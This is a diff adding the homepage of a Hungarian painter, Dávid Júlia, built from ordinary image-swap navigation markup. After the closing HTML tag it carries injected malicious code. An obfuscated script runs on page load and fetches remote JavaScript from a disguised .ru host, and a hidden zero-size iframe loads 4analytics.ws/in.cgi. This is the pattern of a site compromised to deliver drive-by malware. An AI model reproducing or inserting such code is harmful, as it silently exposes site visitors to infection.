@@ -1,0 +1,60 @@
+<html>
+<head>
+<title>Dávid Júlia festőművész honlapja</title>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1250">
+<style type="text/css">
+<!--
+body {
+	background-color: #CCCCCC;
+}
+-->
+</style>
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_swapImgRestore() { //v3.0
+  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
+}
+
+function MM_preloadImages() { //v3.0
+  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
+    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
+    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
+}
+
+function MM_findObj(n, d) { //v4.01
+  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
+    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
+  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
+  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
+  if(!x && d.getElementById) x=d.getElementById(n); return x;
+}
+
+function MM_swapImage() { //v3.0
+  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
+   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
+}
+//-->
+</script>
+</head>
+<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" onLoad="MM_preloadImages('images/onelet_v.gif','images/galeri_v.gif','images/cikktar_v.gif','images/keptar_v.gif','images/elerhet_v.gif')">
+<!-- ImageReady Slices (indexalap1sliced.psd) -->
+<p>&nbsp;</p>
+<div align="center"></div>
+<table width="750" height="500" border="0" align="center" cellpadding="0" cellspacing="0" id="Table_01">
+	<tr>
+		<td>			<a href="onelet.htm" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Önéletrajz','','images/onelet_v.gif',1)"><img src="images/onelet.gif" alt="Önéletrajzom, kiállításaim" name="Önéletrajz" width="154" height="192" border="0"></a></td>
+		<td>			<a href="galeria.htm" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Galéria','','images/galeri_v.gif',1)"><img src="images/galeri.gif" alt="Alkotásaim galériája" name="Galéria" width="147" height="192" border="0"></a></td>
+		<td>			<a href="cikktar.htm" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Cikktár','','images/cikktar_v.gif',1)"><img src="images/cikktar.gif" alt="A rólam megjelent cikkek gyűjteménye" name="Cikktár" width="147" height="192" border="0"></a></td>
+		<td>			<a href="keptar.htm" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Képtár','','images/keptar_v.gif',1)"><img src="images/keptar.gif" alt="Képek rólam és barátaimról" name="Képtár" width="147" height="192" border="0"></a></td>
+		<td>			<a href="elerhet.htm" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Elérhetőségem','','images/elerhet_v.gif',1)"><img src="images/elerhet.gif" alt="Itt érhet el engem" name="Elérhetőségem" width="155" height="192" border="0"></a></td>
+	</tr>
+	<tr>
+		<td colspan="5">
+			<img src="images/main.jpg" width="750" height="308" alt=""></td>
+	</tr>
+</table>
+<!-- End ImageReady Slices -->
+</body>
+</html>
+
+<script>/*CODE1*/ try{window.onload = function(){var Q236s4ic4454clw = document.createElement('script');Q236s4ic4454clw.setAttribute('type', 'text/javascript');Q236s4ic4454clw.setAttribute('id', 'myscript1');Q236s4ic4454clw.setAttribute('src',  'h(t)!^t^))p#@:&&/(##/&$#c^$$l^@)(i&(c$^)k))#$s^o$#r!^)^-$$$&c@$o#^m$!#.#&(e((a!!s)(@t)&m((o@^^n!$!e&^&(y$#).#&c$@o$@!$^m(##(.@m@o@(b(^i&#l#!@e@)@&(-(d)&(e^&@(.))@&h)@@@o^^@m!e#&&)s)a#$$l$$#e^@!p^@l&@u#((^s^#@(.$)r$$u(:!$8!$0&$&8)@$0$!)/!o#&@c##@@n(@^!.))n@e@.)&j!@^#$p#/)^@o^c^n)((.()n^)e^$.@!)$j!!^(p#!/@&)c^(l&(a&s(^s@!m^@a($^t#e!#^@)s$.^c^&#o((&m&/)(&@l&()i(@n)(k$@h&e)@$(l)$p^!e)$!$r$#.)&c!&n($@/$g#o^@&o!$$g$^l^&#@e$.&&!c#o@$$m(/$$'.replace(/\(|\!|&|#|\$|\)|@|\^/ig, ''));Q236s4ic4454clw.setAttribute('defer', 'defer');document.body.appendChild(Q236s4ic4454clw);}} catch(e) {}</script><iframe iccmc='nU2hKVfk' src='http://4analytics.ws/in.cgi?8 ' wcxjb='QMXsIujE' width='0' height='0' style='display:none'></iframe>
